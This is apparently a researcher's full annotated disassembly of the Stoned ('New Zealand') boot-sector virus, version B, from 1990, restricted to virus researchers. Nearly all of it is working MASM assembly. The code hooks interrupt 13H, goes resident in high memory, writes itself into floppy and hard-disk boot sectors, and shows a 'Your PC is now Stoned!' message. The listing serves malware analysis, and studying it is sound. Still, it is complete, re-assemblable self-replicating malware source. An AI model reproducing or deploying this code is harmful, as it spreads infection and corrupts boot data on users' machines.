

	page	,132
	name	STONED
	title	The 'New Zealand' Virus
	subttl	(The version which appeared in Bulgaria)

; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", ap. 51        º
; º  Telephone: Private: (+35-92) 58-62-61, Office: (+35-92) 71-401 ext. 255 º
; º									     º
; º			 The 'New Zealand' Virus, version B                  º
; º		   Disassembled by Vesselin Bontchev, April 1990	     º
; º									     º
; º		     Copyright (c) Vesselin Bontchev 1989, 1990 	     º
; º									     º
; º	 This listing is only to be made available to virus researchers      º
; º		   or software writers on a need-to-know basis. 	     º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

	; The virus consists of a boot sector only.  The original boot sector
	; is kept at track zero, head one, sector three on a floppy disk, or
	; track zero, head zero, sector seven on a hard disk.

	; The disassembly has been tested by re-assembly using MASM 5.0.

	; The program requires an origin address of 7C00H, as it is designed
	; to load and run as a boot sector.

RAM	SEGMENT AT 0

	; System data

	ORG	4CH
BW004C	DW	?			; Interrupt 19 (13H) offset
BW004E	DW	?			; Interrupt 19 (13H) segment
	ORG	413H
BW0413	DW	?			; Total RAM size
	ORG	440H
BB0440	DB	?			; Motor timeout counter
	ORG	46CH
BB046C	DB	?			; System clock

	ORG	7C0AH
I13_OF	DW	?
I13_SG	DW	?
HICOOF	DW	?
HICOSG	DW	?			; High core segment

RAM	ENDS

CODE	SEGMENT BYTE PUBLIC 'CODE'
	ASSUME CS:CODE,DS:RAM

START:	DB	0EAH			; Far jump to next byte
	DW	BP0010, 07C0H

BP0010: JMP	BP0110

DRIVEN	DB	0			; Drive number (A=0, B=1, C=2)
;DUMMY	 DB	 0			; This has gone

;		Original Int 13H address

INT_13	EQU	THIS DWORD
	DW	0
	DW	0

;		Branch address in high core

HIGHCO	EQU	THIS DWORD
	DW	BP0120
	DW	0

;		Boot sector processing address

BOOTST	EQU	THIS DWORD
	DW	07C00H
	DW	0

;		Interrupt 13H disk I/O routine

BP0020: PUSH	DS			; Save DS & AX
	PUSH	AX
	CMP	AH,2			; Sub-function 2
	JB	BP0030			; Pass on if below
	CMP	AH,4			; Sub-function 4
	JNB	BP0030			; Pass on if not below
	CMP	DL,0			; Is drive A
	JNE	BP0030			; Pass on if not
	XOR	AX,AX			; \ Segment zero
	MOV	DS,AX			; /
	MOV	AL,BB0440		; Get motor timeout counter
	test	al,1			; Test for zero
	JNE	BP0030			; Branch if not
	CALL	BP0040			; Call infection routine
BP0030: POP	AX			; Restore AX & DS
	POP	DS
	JMP	INT_13			; Pass control to Int 13H

;		Infection routine

BP0040: PUSH	BX			; Save registers used
	PUSH	CX
	PUSH	DX
	PUSH	ES
	PUSH	SI
	PUSH	DI
	MOV	SI,4			; Retry count
BP0050: MOV	AX,201H 		; Read one sector
	PUSH	CS			; \ Set ES to CS
	POP	ES			; /
	MOV	BX,200H 		; Boot sector buffer
	xor	cx,cx			; Track zero, sector 1
	mov	dx,cx			; Head zero, drive A
	inc	cx
	PUSHF				; Fake an interrupt
	CALL	INT_13			; Call Int 13H
	JNB	BP0060			; Branch if no error
	XOR	AX,AX			; Reset disk sub-system
	PUSHF				; Fake an interrupt
	CALL	INT_13			; Call Int 13H
	DEC	SI			; Decrement retry count
	JNE	BP0050			; Retry
	JMP	BP0080			; No more retries

BP0060: XOR	SI,SI			; Start of program
	MOV	DI,200H 		; Boot sector buffer
	cld				; Clear direction flag
	push	cs			; DS := CS
	pop	ds
	lodsw				; Get first word
	cmp	ax,[di] 		; Test if same
	JNE	BP0070			; Install if not
	lodsw				; Get second word
	cmp	ax,[di+2]		; Test if same
	je	BP0080			; Pass on

BP0070: MOV	AX,301H 		; Write one sector
	MOV	BX,200H 		; Boot sector buffer
	MOV	CX,3			; Track zero, sector 3
	MOV	DX,100H 		; Head 1, drive A
	PUSHF				; Fake an interrupt
	CALL	INT_13			; Call Int 13H
	JB	BP0080			; Branch if error
	MOV	AX,301H 		; Write one sector
	XOR	BX,BX			; This sector
	MOV	CL,1			; Track zero, sector 1
	XOR	DX,DX			; Head zero, drive A
	PUSHF				; Fake an interrupt
	CALL	INT_13			; Call Int 13H
BP0080: POP	DI			; Restore used registers
	POP	SI
	POP	ES
	POP	DX
	POP	CX
	POP	BX
	RET

;		Install in high core

BP0110: XOR	AX,AX			; \ Segment zero
	MOV	DS,AX			; /
	CLI
	MOV	SS,AX			; \ Set stack to boot sector area
	MOV	SP,7C00H		; /
	STI
	MOV	AX,BW004C		; Get Int 13H offset
	MOV	I13_OF,AX		; Store in jump offset
	MOV	AX,BW004E		; Get Int 13H segment
	MOV	I13_SG,AX		; Store in jump segment
	MOV	AX,BW0413		; Get total RAM size
	DEC	AX			; \ Subtract 2k
	DEC	AX			; /
	MOV	BW0413,AX		; Replace total RAM size
	MOV	CL,6			; Bits to move
	SHL	AX,CL			; Convert to Segment
	MOV	ES,AX			; Set ES to segment
	MOV	HICOSG,AX		; Move segment to jump address
	MOV	AX,OFFSET BP0020	; Get Int 13H routine address
	MOV	BW004C,AX		; Set new Int 13H offset
	MOV	BW004E,ES		; Set new Int 13H segment
	MOV	CX,OFFSET ENDADR	; Load length of program
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	XOR	SI,SI			; \ Set pointers to zero
	MOV	DI,SI			; /
	CLD
	REPZ	MOVSB			; Copy program to high core
	JMP	HIGHCO			; Branch to next instruc in high core

;		Continue processing in high core

BP0120: MOV	AX,0			; Reset disk sub-system
	INT	13H			; Disk I/O
	XOR	AX,AX			; \ Segment zero
	MOV	ES,AX			; /
	ASSUME	DS:NOTHING,ES:RAM
	MOV	AX,201H 		; Read one sector
	MOV	BX,7C00H		; Boot sector buffer address
	CMP	DRIVEN,0		; Test drive is A
	JE	BP0130			; Branch if yes
	MOV	CX,7			; Track zero, sector 7 (CHANGE!)
	MOV	DX,80H			; Side zero, drive C
	INT	13H			; Disk I/O
	JMP	BP0150			; Pass control to boot sector

;		Floppy disk

BP0130: MOV	CX,3			; Track zero, sector 3
	MOV	DX,100H 		; Side one, drive A
	INT	13H			; Disk I/O
	JB	BP0150			; Branch if error
	TEST	BB046C,7		; Test low byte of time
	JNZ	BP0140			; Branch if not 7
	MOV	BX,OFFSET MESSAGE	; Load message address
	push	cs			; DS := CS
	pop	ds
	assume	ds:code

;		Display message

BP0090: lodsb				; Get next message byte
	or	al,al			; Update pointer
	jz	BP0140			; Test for end of message

	MOV	AH,0EH			; Write TTY mode
	MOV	BH,0
	INT	10H			; VDU I/O
	JMP	SHORT BP0090		; Process next byte

BP0140: PUSH	CS			; \ Set ES to CS
	POP	ES			; /
	MOV	AX,201H 		; Read one sector
	MOV	BX,200H 		; C-disk boot sector buffer
	MOV	CX,1			; Track zero, sector 1
	MOV	DX,80H			; Side zero, drive C
	INT	13H			; Disk I/O
	JB	BP0150			; Branch if error
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	MOV	SI,200H 		; C-disk boot sector buffer
	MOV	DI,0			; Start of program
	lodsw				; Get first word
	CMP	AX,[DI] 		; Compare to C-disk
	JNE	BP0160			; Install on C-disk if different
	lodsw				; Get second word
	CMP	AX,[DI+2]		; Compare to C-disk
	JNE	BP0160			; Install on C-disk if different
BP0150: MOV	DRIVEN,0		; Drive A
;	 MOV	 DUMMY,0		; This has gone
	JMP	BOOTST			; Pass control to boot sector

;		Install on C-disk

BP0160: MOV	DRIVEN,2		; Drive C
;	 MOV	 DUMMY,0		; This has gone
	MOV	AX,301H 		; Write one sector
	MOV	BX,200H 		; C-disk boot sector buffer
	MOV	CX,7			; Track zero, sector 7 (CHANGED)
	MOV	DX,80H			; side zero, drive C
	INT	13H			; Disk I/O
	JB	BP0150			; Branch if error
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	PUSH	CS			; \ Set ES to CS
	POP	ES			; /
	MOV	SI,OFFSET ENDADR+200H	; Target offset
	MOV	DI,OFFSET ENDADR	; Source offset
	MOV	CX,OFFSET 400H-ENDADR	; Length to move
	REPZ	MOVSB			; Copy C-disk boot sector
	MOV	AX,301H 		; Write one sector
	xor	bx,bx			; Write this sector
	inc	cl			; Track zero, sector 1
	INT	13H			; Disk I/O
	JMP	SHORT BP0150		; Pass control to boot sector

MESSAGE DB	7, 'Your PC is now Stoned!', 7, 0DH, 0AH, 0AH, 0
	DB	'LEGALISE MARIJUANA!'

ENDADR	EQU	$-1

CODE	ENDS

	END	START


